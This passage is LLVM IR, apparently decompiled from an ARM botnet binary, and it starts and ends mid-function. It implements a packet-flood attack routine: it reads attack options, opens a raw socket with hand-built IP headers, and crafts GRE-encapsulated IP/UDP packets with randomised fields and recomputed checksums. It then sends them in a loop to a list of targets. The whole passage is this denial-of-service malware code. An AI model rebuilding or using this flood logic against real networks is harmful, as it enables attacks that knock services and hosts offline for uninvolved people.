  %v0_9178 = load i32, i32* @r4, align 4
  %v5_917c = inttoptr i32 %v0_9168 to i32*
  %v6_917c = call i32 @attack_get_opt_int(i32 %v0_9178, i32* %v5_917c, i32 25, i32 %v2_916c, i32 ptrtoint (i32* @0 to i32))
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_9190 = call i32 @socket(i32 2, i32 3, i32 6)
  %v7_9194 = icmp eq i32 %v3_9190, -1
  store i1 %v7_9194, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9194, label %dec_label_pc_9634, label %dec_label_pc_91a0

dec_label_pc_91a0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_91a8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_91a8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_91bc = call i32 @__GI_setsockopt(i32 %v3_9190, i32 0, i32 3, i32 %v6_91a8, i32 4)
  %v7_91c0 = icmp eq i32 %v5_91bc, -1
  store i1 %v7_91c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_91c0, label %dec_label_pc_962c, label %dec_label_pc_91c8

dec_label_pc_91c8:                                ; preds = %dec_label_pc_91a0
  %v0_91c8 = load i32, i32* @r8, align 4
  %v0_91cc = load i32, i32* @r7, align 4
  %v0_91d0 = load i32, i32* %fp.global-to-local, align 4
  %v0_91d4 = load i32, i32* @r6, align 4
  %v1_91d4 = urem i32 %v0_91d4, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_91dc = urem i32 %v0_91c8, 65536
  store i32 %v3_91dc, i32* %r3.global-to-local, align 4
  %v3_91e0 = urem i32 %v0_91cc, 65536
  store i32 %v3_91e0, i32* %r4.global-to-local, align 4
  %v0_91e4 = load i32, i32* @sl, align 4
  %v2_91e4 = icmp eq i32 %v0_91e4, 0
  store i1 %v2_91e4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_91fc = urem i32 %v0_91d0, 65536
  store i32 %v3_91fc, i32* @fp, align 4
  br i1 %v2_91e4, label %dec_label_pc_9640, label %dec_label_pc_920c

dec_label_pc_920c:                                ; preds = %dec_label_pc_91c8
  %v3_91cc = mul i32 %v0_91cc, 65536
  %v3_91c8 = mul i32 %v0_91c8, 65536
  %v0_91d0.not = or i32 %v0_91d0, -65536
  %v1_9210 = xor i32 %v0_91d0.not, 65535
  %v3_9214 = mul i32 %v6_9128, 65536
  %v1_9218 = add i32 %v3_9214, 3407872
  %tmp67 = udiv i32 %v1_9218, 256
  %v3_922c = and i32 %tmp67, 65280
  %tmp68 = mul nsw i32 %v1_9210, 256
  %v3_9230 = and i32 %tmp68, 65280
  store i32 %v3_9230, i32* %ip.global-to-local, align 4
  %v1_9234 = add i32 %v3_9214, 524288
  %v1_923c = add i32 %v3_9214, 1835008
  %tmp69 = udiv i32 %v1_9210, 256
  %v4_9240 = urem i32 %tmp69, 256
  %v5_9240 = or i32 %v4_9240, %v3_9230
  %v4_9248 = udiv i32 %v1_9218, 16777216
  %v5_9248 = or i32 %v3_922c, %v4_9248
  store i32 %v5_9248, i32* @r8, align 4
  %v3_9254 = udiv i32 %v1_923c, 256
  %tmp70 = mul i32 %v0_91d0, 256
  %v3_9258 = and i32 %tmp70, 65280
  store i32 %v3_91c8, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v0_91d0, 256
  %v4_9268 = urem i32 %tmp71, 256
  %v5_9268 = or i32 %v4_9268, %v3_9258
  %tmp72 = mul i32 %v0_91c8, 256
  %v3_926c = and i32 %tmp72, 65280
  %v1_9270 = and i32 %v3_9254, 65280
  store i32 %v1_9270, i32* @r6, align 4
  store i32 %v3_91cc, i32* %r1.global-to-local, align 4
  %tmp73 = mul i32 %v0_91cc, 256
  %v3_927c = and i32 %tmp73, 65280
  %tmp74 = udiv i32 %v0_91c8, 256
  %v4_9280 = urem i32 %tmp74, 256
  %v5_9280 = or i32 %v4_9280, %v3_926c
  store i32 %v5_9280, i32* @lr, align 4
  %v4_9284 = udiv i32 %v1_923c, 16777216
  %v5_9284 = or i32 %v1_9270, %v4_9284
  store i32 %v5_9284, i32* %r3.global-to-local, align 4
  %tmp75 = udiv i32 %v0_91cc, 256
  %v4_9288 = urem i32 %tmp75, 256
  %v5_9288 = or i32 %v4_9288, %v3_927c
  %tmp76 = udiv i32 %v1_9234, 256
  %v3_928c = and i32 %tmp76, 65280
  store i32 %v3_928c, i32* @r5, align 4
  %v4_92a0 = udiv i32 %v1_9234, 16777216
  %v5_92a0 = or i32 %v3_928c, %v4_92a0
  store i32 %v5_92a0, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %sext12 = mul nuw i32 %v5_9268, 65536
  %v4_930c13 = sdiv i32 %sext12, 65536
  %sext8 = mul nuw i32 %v5_9284, 65536
  %v4_9370 = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_9240, 65536
  %v4_9374 = sdiv i32 %sext9, 65536
  %v1_937c = trunc i32 %v4_9370 to i16
  %v2_93a4 = icmp eq i32 %v1_91d4, 0
  %sext10 = mul nuw i32 %v5_9280, 65536
  %v4_93c4 = sdiv i32 %sext10, 65536
  %sext11 = mul nuw i32 %v5_9288, 65536
  %v4_93cc = sdiv i32 %sext11, 65536
  %v1_9304 = trunc i32 %v6_90b0 to i8
  br label %dec_label_pc_92a8

dec_label_pc_92a8:                                ; preds = %bb82, %dec_label_pc_920c
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_92b4 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_905c, i32* %r2.global-to-local, align 4
  %v3_92bc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_92bc, i32* %r3.global-to-local, align 4
  %v2_92c0 = load i32, i32* @r4, align 4
  %v5_92c0 = mul i32 %v2_92c0, 4
  %v6_92c0 = add i32 %v5_92c0, %v2_905c
  %v7_92c0 = inttoptr i32 %v6_92c0 to i32*
  store i32 %v2_92b4, i32* %v7_92c0, align 4
  %v0_92c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_92c4 = load i32, i32* %r3.global-to-local, align 4
  %v4_92c4 = mul i32 %v1_92c4, 4
  %v5_92c4 = add i32 %v4_92c4, %v0_92c4
  %v6_92c4 = inttoptr i32 %v5_92c4 to i32*
  %v7_92c4 = load i32, i32* %v6_92c4, align 4
  store i32 %v7_92c4, i32* %r4.global-to-local, align 4
  %v1_92c8 = inttoptr i32 %v7_92c4 to i8*
  %v2_92c8 = load i8, i8* %v1_92c8, align 1
  %tmp = urem i8 %v2_92c8, 16
  %v1_92cc = zext i8 %tmp to i32
  %v1_92d0 = or i32 %v1_92cc, 64
  store i32 %v1_92d0, i32* %r2.global-to-local, align 4
  %v1_92d4 = trunc i32 %v1_92d0 to i8
  store i8 %v1_92d4, i8* %v1_92c8, align 1
  %v0_92d8 = load i32, i32* %r3.global-to-local, align 4
  %v5_92dc = mul i32 %v0_92d8, 24
  store i32 %v5_92dc, i32* %r1.global-to-local, align 4
  %v0_92e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_92e0 = inttoptr i32 %v0_92e0 to i8*
  %v2_92e0 = load i8, i8* %v1_92e0, align 1
  %v1_92e4 = and i8 %v2_92e0, -16
  %v1_92e8 = or i8 %v1_92e4, 5
  store i32 %v1_90dc, i32* %r5.global-to-local, align 4
  store i8 %v1_92e8, i8* %v1_92e0, align 1
  store i32 %v6_9074, i32* %r2.global-to-local, align 4
  %v2_92f8 = load i32, i32* %r4.global-to-local, align 4
  %v3_92f8 = add i32 %v2_92f8, 1
  %v4_92f8 = inttoptr i32 %v3_92f8 to i8*
  store i8 %v5_9094, i8* %v4_92f8, align 1
  store i32 %v1_90b8, i32* %r3.global-to-local, align 4
  %v0_9300 = load i32, i32* %r5.global-to-local, align 4
  %v2_9300 = icmp eq i32 %v0_9300, 0
  store i1 %v2_9300, i1* %cpsr_z.global-to-local, align 1
  %v2_9304 = load i32, i32* %r4.global-to-local, align 4
  %v3_9304 = add i32 %v2_9304, 8
  %v4_9304 = inttoptr i32 %v3_9304 to i8*
  store i8 %v1_9304, i8* %v4_9304, align 1
  %v0_9308 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9308, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_92a8
  store i32 %v4_930c13, i32* %r5.global-to-local, align 4
  br label %bb77

bb:                                               ; preds = %dec_label_pc_92a8
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v4_930c13, i32* %r5.global-to-local, align 4
  %v3_9310 = load i32, i32* %r4.global-to-local, align 4
  %v4_9310 = add i32 %v3_9310, 6
  %v5_9310 = inttoptr i32 %v4_9310 to i16*
  store i16 64, i16* %v5_9310, align 2
  br label %bb77

bb77:                                             ; preds = %.thread, %bb
  %v2_9318 = load i32, i32* %r4.global-to-local, align 4
  %v3_9318 = add i32 %v2_9318, 9
  %v4_9318 = inttoptr i32 %v3_9318 to i8*
  store i8 47, i8* %v4_9318, align 1
  %v0_931c = load i32, i32* %r4.global-to-local, align 4
  %v1_931c = add i32 %v0_931c, 20
  store i32 %v1_931c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_9324 = load i32, i32* %r5.global-to-local, align 4
  %v1_9324 = trunc i32 %v0_9324 to i16
  %v3_9324 = add i32 %v0_931c, 4
  %v4_9324 = inttoptr i32 %v3_9324 to i16*
  store i16 %v1_9324, i16* %v4_9324, align 2
  %v0_9328 = load i32, i32* @r8, align 4
  %v1_9328 = trunc i32 %v0_9328 to i16
  %v2_9328 = load i32, i32* %r4.global-to-local, align 4
  %v3_9328 = add i32 %v2_9328, 2
  %v4_9328 = inttoptr i32 %v3_9328 to i16*
  store i16 %v1_9328, i16* %v4_9328, align 2
  %v0_932c = load i32, i32* %r3.global-to-local, align 4
  %v1_932c = trunc i32 %v0_932c to i16
  %v2_932c = load i32, i32* %r2.global-to-local, align 4
  %v3_932c = add i32 %v2_932c, 2
  %v4_932c = inttoptr i32 %v3_932c to i16*
  store i16 %v1_932c, i16* %v4_932c, align 2
  store i32 %v6_917c, i32* %r3.global-to-local, align 4
  %v0_9334 = load i32, i32* %r4.global-to-local, align 4
  %v1_9334 = add i32 %v0_9334, 24
  %v2_9334 = inttoptr i32 %v1_9334 to i8*
  %v3_9334 = load i8, i8* %v2_9334, align 1
  %v4_9334 = zext i8 %v3_9334 to i32
  store i32 %v4_9334, i32* %r2.global-to-local, align 4
  %v2_9338 = add i32 %v0_9334, 12
  %v3_9338 = inttoptr i32 %v2_9338 to i32*
  store i32 %v6_917c, i32* %v3_9338, align 4
  %v0_933c = load i32, i32* %r2.global-to-local, align 4
  %v1_933c = and i32 %v0_933c, -241
  %v1_9340 = or i32 %v1_933c, 64
  store i32 %v1_9340, i32* %r2.global-to-local, align 4
  %v0_9344 = load i32, i32* %r1.global-to-local, align 4
  %v1_9344 = load i32, i32* @sb, align 4
  %v2_9344 = add i32 %v1_9344, %v0_9344
  store i32 %v2_9344, i32* %r1.global-to-local, align 4
  %v1_9348 = add i32 %v2_9344, 16
  %v2_9348 = inttoptr i32 %v1_9348 to i32*
  %v3_9348 = load i32, i32* %v2_9348, align 4
  store i32 %v3_9348, i32* %r1.global-to-local, align 4
  %v1_934c = trunc i32 %v1_9340 to i8
  %v2_934c = load i32, i32* %r4.global-to-local, align 4
  %v3_934c = add i32 %v2_934c, 24
  %v4_934c = inttoptr i32 %v3_934c to i8*
  store i8 %v1_934c, i8* %v4_934c, align 1
  %v0_9350 = load i32, i32* %r4.global-to-local, align 4
  %v1_9350 = add i32 %v0_9350, 24
  %v2_9350 = inttoptr i32 %v1_9350 to i8*
  %v3_9350 = load i8, i8* %v2_9350, align 1
  %v1_9354 = and i8 %v3_9350, -16
  %v1_9358 = or i8 %v1_9354, 5
  store i8 %v1_9358, i8* %v2_9350, align 1
  %v0_9360 = load i32, i32* %r1.global-to-local, align 4
  %v1_9360 = load i32, i32* %r4.global-to-local, align 4
  %v2_9360 = add i32 %v1_9360, 16
  %v3_9360 = inttoptr i32 %v2_9360 to i32*
  store i32 %v0_9360, i32* %v3_9360, align 4
  %v0_9368 = load i32, i32* %r4.global-to-local, align 4
  %v1_9368 = add i32 %v0_9368, 24
  store i32 %v1_9368, i32* @r5, align 4
  %v3_936c = add i32 %v0_9368, 25
  %v4_936c = inttoptr i32 %v3_936c to i8*
  store i8 %v5_9094, i8* %v4_936c, align 1
  store i32 %v4_9370, i32* %r2.global-to-local, align 4
  store i32 %v4_9374, i32* %r3.global-to-local, align 4
  store i32 %v1_90b8, i32* %r1.global-to-local, align 4
  %v2_937c = load i32, i32* @r5, align 4
  %v3_937c = add i32 %v2_937c, 2
  %v4_937c = inttoptr i32 %v3_937c to i16*
  store i16 %v1_937c, i16* %v4_937c, align 2
  %v0_9380 = load i32, i32* %r3.global-to-local, align 4
  %v1_9380 = trunc i32 %v0_9380 to i16
  %v2_9380 = load i32, i32* @r5, align 4
  %v3_9380 = add i32 %v2_9380, 4
  %v4_9380 = inttoptr i32 %v3_9380 to i16*
  store i16 %v1_9380, i16* %v4_9380, align 2
  %v0_9384 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9384, label %bb79, label %bb78

bb78:                                             ; preds = %bb77
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %bb77, %bb78
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_938c = load i32, i32* %r1.global-to-local, align 4
  %v1_938c = trunc i32 %v0_938c to i8
  %v2_938c = load i32, i32* @r5, align 4
  %v3_938c = add i32 %v2_938c, 8
  %v4_938c = inttoptr i32 %v3_938c to i8*
  store i8 %v1_938c, i8* %v4_938c, align 1
  %v0_9390 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9390, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_9390 = load i32, i32* %r2.global-to-local, align 4
  %v2_9390 = trunc i32 %v1_9390 to i16
  %v3_9390 = load i32, i32* @r5, align 4
  %v4_9390 = add i32 %v3_9390, 6
  %v5_9390 = inttoptr i32 %v4_9390 to i16*
  store i16 %v2_9390, i16* %v5_9390, align 2
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v0_9394 = load i32, i32* %r3.global-to-local, align 4
  %v1_9394 = trunc i32 %v0_9394 to i8
  %v2_9394 = load i32, i32* @r5, align 4
  %v3_9394 = add i32 %v2_9394, 9
  %v4_9394 = inttoptr i32 %v3_9394 to i8*
  store i8 %v1_9394, i8* %v4_9394, align 1
  %v0_9398 = call i32 @rand_next()
  store i32 %v1_91d4, i32* %r1.global-to-local, align 4
  store i1 %v2_93a4, i1* %cpsr_z.global-to-local, align 1
  %v1_93a8 = sub i32 1023, %v0_9398
  store i32 %v1_93a8, i32* %r3.global-to-local, align 4
  br i1 %v2_93a4, label %.thread14, label %.thread15

.thread14:                                        ; preds = %bb81
  %v2_93b0 = load i32, i32* @r5, align 4
  %v3_93b0 = add i32 %v2_93b0, 16
  %v4_93b0 = inttoptr i32 %v3_93b0 to i32*
  store i32 %v1_93a8, i32* %v4_93b0, align 4
  br label %bb82

.thread15:                                        ; preds = %bb81
  %v1_93ac = load i32, i32* %r4.global-to-local, align 4
  %v2_93ac = add i32 %v1_93ac, 16
  %v3_93ac = inttoptr i32 %v2_93ac to i32*
  %v4_93ac = load i32, i32* %v3_93ac, align 4
  store i32 %v4_93ac, i32* %r3.global-to-local, align 4
  %v2_93b4 = load i32, i32* @r5, align 4
  %v3_93b4 = add i32 %v2_93b4, 16
  %v4_93b4 = inttoptr i32 %v3_93b4 to i32*
  store i32 %v4_93ac, i32* %v4_93b4, align 4
  br label %bb82

bb82:                                             ; preds = %.thread14, %.thread15
  %v1_93b8 = load i32, i32* @r5, align 4
  %v2_93b8 = add i32 %v1_93b8, 12
  %v3_93b8 = inttoptr i32 %v2_93b8 to i32*
  store i32 %v0_9398, i32* %v3_93b8, align 4
  %v3_93bc = load i32, i32* %stack_var_-44, align 4
  %v0_93c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_93c0 = add i32 %v0_93c0, 44
  store i32 %v1_93c0, i32* @r6, align 4
  store i32 %v4_93c4, i32* %r2.global-to-local, align 4
  %v1_93c8 = add i32 %v3_93bc, 1
  store i32 %v1_93c8, i32* @r4, align 4
  store i32 %v4_93cc, i32* %r3.global-to-local, align 4
  %v1_93d0 = load i32, i32* @sl, align 4
  %v9_93d0 = icmp eq i32 %v1_93c8, %v1_93d0
  store i1 %v9_93d0, i1* %cpsr_z.global-to-local, align 1
  %v0_93d4 = load i32, i32* @r7, align 4
  %v1_93d4 = trunc i32 %v0_93d4 to i16
  %v3_93d4 = add i32 %v0_93c0, 48
  %v4_93d4 = inttoptr i32 %v3_93d4 to i16*
  store i16 %v1_93d4, i16* %v4_93d4, align 2
  %v0_93d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_93d8 = trunc i32 %v0_93d8 to i16
  %v2_93d8 = load i32, i32* @r6, align 4
  %v3_93d8 = inttoptr i32 %v2_93d8 to i16*
  store i16 %v1_93d8, i16* %v3_93d8, align 2
  %v0_93dc = load i32, i32* %r3.global-to-local, align 4
  %v1_93dc = trunc i32 %v0_93dc to i16
  %v2_93dc = load i32, i32* @r6, align 4
  %v3_93dc = add i32 %v2_93dc, 2
  %v4_93dc = inttoptr i32 %v3_93dc to i16*
  store i16 %v1_93dc, i16* %v4_93dc, align 2
  %v0_93e0 = load i32, i32* @r4, align 4
  store i32 %v0_93e0, i32* %stack_var_-44, align 4
  %v5_93e4 = icmp slt i32 %v1_93c8, %v1_93d0
  br i1 %v5_93e4, label %dec_label_pc_92a8, label %dec_label_pc_93e8

dec_label_pc_93e8:                                ; preds = %bb82
  store i32 %v6_9128, i32* %r5.global-to-local, align 4
  %v1_93f0 = add i32 %v6_9128, 8
  store i32 %v1_93f0, i32* %r4.global-to-local, align 4
  %v0_9400.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_93fc.preheader

dec_label_pc_93fc.preheader:                      ; preds = %dec_label_pc_93e8, %dec_label_pc_9640
  %v0_9400.pre = phi i32 [ %v0_9400.pre.pre, %dec_label_pc_93e8 ], [ 0, %dec_label_pc_9640 ]
  %stack_var_-124.0.ph = phi i32 [ %v1_93f0, %dec_label_pc_93e8 ], [ %v1_9648, %dec_label_pc_9640 ]
  %storemerge = add i32 %v6_9128, 52
  store i32 %storemerge, i32* @r8, align 4
  %v2_95f4 = icmp eq i32 %v1_91d4, 0
  %v2_9610 = icmp eq i32 %v1_9148, 0
  %v2_943c = icmp eq i32 %v6_917c, -1
  %v7_943c = icmp eq i32 %v6_917c, -1
  br label %dec_label_pc_93fc

dec_label_pc_93fc:                                ; preds = %dec_label_pc_93fc, %dec_label_pc_948c, %dec_label_pc_93fc.preheader
  %v0_9400 = phi i32 [ %v0_9400.pre, %dec_label_pc_93fc.preheader ], [ 0, %dec_label_pc_93fc ], [ %v1_9528, %dec_label_pc_948c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9400 = icmp eq i32 %v0_9400, 0
  store i1 %v2_9400, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9400, label %dec_label_pc_93fc, label %dec_label_pc_940c

dec_label_pc_940c:                                ; preds = %dec_label_pc_93fc
  br label %dec_label_pc_9410

dec_label_pc_9410:                                ; preds = %dec_label_pc_948c, %dec_label_pc_940c
  %v1_9424 = phi i32 [ %v1_9524, %dec_label_pc_948c ], [ 0, %dec_label_pc_940c ]
  %v5_9414 = mul i32 %v1_9424, 24
  %v1_9418 = load i32, i32* @sb, align 4
  %v2_9418 = add i32 %v1_9418, %v5_9414
  store i32 %v2_9418, i32* %r3.global-to-local, align 4
  store i32 %v2_905c, i32* %r4.global-to-local, align 4
  %v1_9420 = add i32 %v2_9418, 20
  %v2_9420 = inttoptr i32 %v1_9420 to i8*
  %v3_9420 = load i8, i8* %v2_9420, align 1
  %v4_9420 = zext i8 %v3_9420 to i32
  store i32 %v4_9420, i32* %r2.global-to-local, align 4
  %v4_9424 = mul i32 %v1_9424, 4
  %v5_9424 = add i32 %v4_9424, %v2_905c
  %v6_9424 = inttoptr i32 %v5_9424 to i32*
  %v7_9424 = load i32, i32* %v6_9424, align 4
  store i32 %v7_9424, i32* @r5, align 4
  %v7_9428 = icmp eq i8 %v3_9420, 31
  store i1 %v7_9428, i1* %cpsr_z.global-to-local, align 1
  %v1_942c = add i32 %v7_9424, 24
  store i32 %v1_942c, i32* @r6, align 4
  %v1_9430 = add i32 %v7_9424, 44
  store i32 %v1_9430, i32* @r7, align 4
  %tmp84 = icmp ult i8 %v3_9420, 32
  br i1 %tmp84, label %dec_label_pc_9538, label %dec_label_pc_9438

dec_label_pc_9438:                                ; preds = %dec_label_pc_9410
  store i32 %v6_917c, i32* %r1.global-to-local, align 4
  store i1 %v7_943c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_943c, label %dec_label_pc_9598, label %dec_label_pc_9444

dec_label_pc_9444:                                ; preds = %dec_label_pc_9538, %dec_label_pc_9438
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r4.global-to-local, align 4
  %v0_944c = load i32, i32* @fp, align 4
  %v9_944c = icmp eq i32 %v0_944c, add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1)
  store i1 %v9_944c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_944c, label %dec_label_pc_95b0, label %dec_label_pc_9454

dec_label_pc_9454:                                ; preds = %dec_label_pc_9598.dec_label_pc_9454_crit_edge, %dec_label_pc_9444
  %v1_9458 = phi i32 [ %v1_9458.pre, %dec_label_pc_9598.dec_label_pc_9454_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), %dec_label_pc_9444 ]
  store i32 %v3_91dc, i32* %r2.global-to-local, align 4
  %v9_9458 = icmp eq i32 %v3_91dc, %v1_9458
  store i1 %v9_9458, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9458, label %dec_label_pc_95d8, label %dec_label_pc_9460

dec_label_pc_9460:                                ; preds = %dec_label_pc_95b0.dec_label_pc_9460_crit_edge, %dec_label_pc_9454
  %v1_9464 = phi i32 [ %v1_9464.pre, %dec_label_pc_95b0.dec_label_pc_9460_crit_edge ], [ %v1_9458, %dec_label_pc_9454 ]
  store i32 %v3_91e0, i32* %r3.global-to-local, align 4
  %v9_9464 = icmp eq i32 %v3_91e0, %v1_9464
  store i1 %v9_9464, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9464, label %dec_label_pc_95ec, label %dec_label_pc_946c

dec_label_pc_946c:                                ; preds = %dec_label_pc_95d8, %dec_label_pc_9460
  store i32 %v1_91d4, i32* @r4, align 4
  store i1 %v2_95f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_95f4, label %dec_label_pc_9608, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_946c
  %v1_9474 = load i32, i32* @r5, align 4
  %v2_9474 = add i32 %v1_9474, 16
  %v3_9474 = inttoptr i32 %v2_9474 to i32*
  %v4_9474 = load i32, i32* %v3_9474, align 4
  store i32 %v4_9474, i32* %r3.global-to-local, align 4
  %v2_9478 = load i32, i32* @r6, align 4
  %v3_9478 = add i32 %v2_9478, 16
  %v4_9478 = inttoptr i32 %v3_9478 to i32*
  store i32 %v4_9474, i32* %v4_9478, align 4
  br label %dec_label_pc_9480

dec_label_pc_9480:                                ; preds = %bb83, %.thread16
  store i32 %v1_9148, i32* %r1.global-to-local, align 4
  store i1 %v2_9610, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9610, label %dec_label_pc_948c, label %dec_label_pc_961c

dec_label_pc_948c:                                ; preds = %dec_label_pc_9480, %dec_label_pc_9608, %dec_label_pc_961c
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_9490 = load i32, i32* @r5, align 4
  %v3_9490 = add i32 %v2_9490, 10
  %v4_9490 = inttoptr i32 %v3_9490 to i16*
  store i16 0, i16* %v4_9490, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9498 = load i32, i32* @r5, align 4
  store i32 %v0_9498, i32* @r0, align 4
  %v2_949c = call i32 @checksum_generic(i32 %v0_9498, i32 20)
  %v3_949c = trunc i32 %v2_949c to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_94a4 = load i32, i32* @r5, align 4
  %v4_94a4 = add i32 %v3_94a4, 10
  %v5_94a4 = inttoptr i32 %v4_94a4 to i16*
  store i16 %v3_949c, i16* %v5_94a4, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_94ac = load i32, i32* %r3.global-to-local, align 4
  %v1_94ac = trunc i32 %v0_94ac to i16
  %v2_94ac = load i32, i32* @r6, align 4
  %v3_94ac = add i32 %v2_94ac, 10
  %v4_94ac = inttoptr i32 %v3_94ac to i16*
  store i16 %v1_94ac, i16* %v4_94ac, align 2
  %v0_94b0 = load i32, i32* @r6, align 4
  store i32 %v0_94b0, i32* @r0, align 4
  %v2_94b4 = call i32 @checksum_generic(i32 %v0_94b0, i32 20)
  %v3_94b4 = trunc i32 %v2_94b4 to i16
  %v3_94b8 = load i32, i32* @r6, align 4
  %v4_94b8 = add i32 %v3_94b8, 10
  %v5_94b8 = inttoptr i32 %v4_94b8 to i16*
  store i16 %v3_94b4, i16* %v5_94b8, align 2
  store i32 0, i32* @r4, align 4
  %v0_94c0 = load i32, i32* @r7, align 4
  store i32 %v0_94c0, i32* @r1, align 4
  %v1_94c4 = add i32 %v0_94c0, 4
  %v2_94c4 = inttoptr i32 %v1_94c4 to i16*
  %v3_94c4 = load i16, i16* %v2_94c4, align 2
  %v4_94c4 = zext i16 %v3_94c4 to i32
  store i32 %v4_94c4, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-124.0.ph, i32* %r3.global-to-local, align 4
  %v3_94cc = add i32 %v0_94c0, 6
  %v4_94cc = inttoptr i32 %v3_94cc to i16*
  store i16 0, i16* %v4_94cc, align 2
  %v0_94d0 = load i32, i32* @r6, align 4
  %v4_94d4 = call i32 @checksum_tcpudp(i32 %v0_94d0, i32 %v0_94c0, i32 %v4_94c4, i32 %stack_var_-124.0.ph)
  %v5_94d4 = trunc i32 %v4_94d4 to i16
  %v3_94d8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_94d8, i32* %r2.global-to-local, align 4
  %v3_94dc = mul i32 %v3_94d8, 32
  store i32 %v3_94dc, i32* %r3.global-to-local, align 4
  %v0_94e0 = load i32, i32* @r5, align 4
  %v1_94e0 = add i32 %v0_94e0, 16
  %v2_94e0 = inttoptr i32 %v1_94e0 to i32*
  %v3_94e0 = load i32, i32* %v2_94e0, align 4
  %v5_94e4 = mul i32 %v3_94d8, 24
  store i32 %v5_94e4, i32* %r3.global-to-local, align 4
  %v1_94e8 = load i32, i32* @sb, align 4
  %v2_94e8 = add i32 %v1_94e8, %v5_94e4
  store i32 %v2_94e8, i32* @lr, align 4
  %v2_94ec = add i32 %v2_94e8, 4
  %v3_94ec = inttoptr i32 %v2_94ec to i32*
  store i32 %v3_94e0, i32* %v3_94ec, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_94f4 = load i32, i32* @r7, align 4
  %v4_94f4 = add i32 %v3_94f4, 6
  %v5_94f4 = inttoptr i32 %v4_94f4 to i16*
  store i16 %v5_94d4, i16* %v5_94f4, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_94fc = load i32, i32* %r1.global-to-local, align 4
  %v1_94fc = trunc i32 %v0_94fc to i16
  %v2_94fc = load i32, i32* %r3.global-to-local, align 4
  %v3_94fc = load i32, i32* @sb, align 4
  %v4_94fc = add i32 %v3_94fc, %v2_94fc
  %v5_94fc = inttoptr i32 %v4_94fc to i16*
  store i16 %v1_94fc, i16* %v5_94fc, align 2
  %v0_9500 = load i32, i32* @r4, align 4
  %v1_9500 = trunc i32 %v0_9500 to i16
  %v2_9500 = load i32, i32* @lr, align 4
  %v3_9500 = add i32 %v2_9500, 2
  %v4_9500 = inttoptr i32 %v3_9500 to i16*
  store i16 %v1_9500, i16* %v4_9500, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9508 = load i32, i32* @r5, align 4
  store i32 %v0_9508, i32* %r1.global-to-local, align 4
  %v0_9510 = load i32, i32* @r8, align 4
  store i32 %v0_9510, i32* %r2.global-to-local, align 4
  %v0_9514 = load i32, i32* @lr, align 4
  %v0_9518 = load i32, i32* %ip.global-to-local, align 4
  %v6_951c = call i32 @__libc_sendto(i32 %v3_9190, i32 %v0_9508, i32 %v0_9510, i32 16384, i32 %v0_9514, i32 %v0_9518)
  %v3_9520 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9520, i32* %r3.global-to-local, align 4
  %v1_9524 = add i32 %v3_9520, 1
  %v1_9528 = load i32, i32* @sl, align 4
  %v9_9528 = icmp eq i32 %v1_9524, %v1_9528
  store i1 %v9_9528, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9524, i32* %stack_var_-44, align 4
  %v6_9530 = icmp slt i32 %v1_9524, %v1_9528
  br i1 %v6_9530, label %dec_label_pc_9410, label %dec_label_pc_93fc

dec_label_pc_9538:                                ; preds = %dec_label_pc_9410
  %v1_9538 = add i32 %v2_9418, 16
  %v2_9538 = inttoptr i32 %v1_9538 to i32*
  %v3_9538 = load i32, i32* %v2_9538, align 4
  store i32 %v3_9538, i32* %r4.global-to-local, align 4
  %v0_953c = call i32 @rand_next()
